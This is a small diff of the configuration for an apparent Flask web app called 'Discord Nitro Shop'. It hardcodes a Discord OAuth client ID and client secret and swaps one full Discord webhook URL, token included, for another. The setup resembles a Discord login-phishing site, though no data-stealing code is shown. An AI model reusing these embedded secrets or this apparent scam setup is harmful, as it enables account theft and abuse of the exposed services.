@@ -12,7 +12,7 @@ app.secret_key = os.urandom(32)
 # ═══════════════════════════════════════
 CLIENT_ID = "1541786357028884534"
 CLIENT_SECRET = "7n8YSrS5CM3cabjqeQY_ba-nsvax0bOW"
-WEBHOOK_URL = "https://discord.com/api/webhooks/1541770051777208360/Z1sxSK-tfzhm9d4d77i1rokSDM7kV0eSAXYSKWOiNLG4Z7tpqET2-eDevOgK_cFmRtTG"
+WEBHOOK_URL = "https://discord.com/api/webhooks/1541770049289982052/6YJdl0YKbhSoP2sQ82zkPdqx0vFeaTGeaWoPPwHXNv8wYn1pU4ijysoaIHzgdF1zx0KR"
 REDIRECT_URI = "https://jjjw.vercel.app/callback"
 SITE_NAME = "Discord Nitro Shop"
 
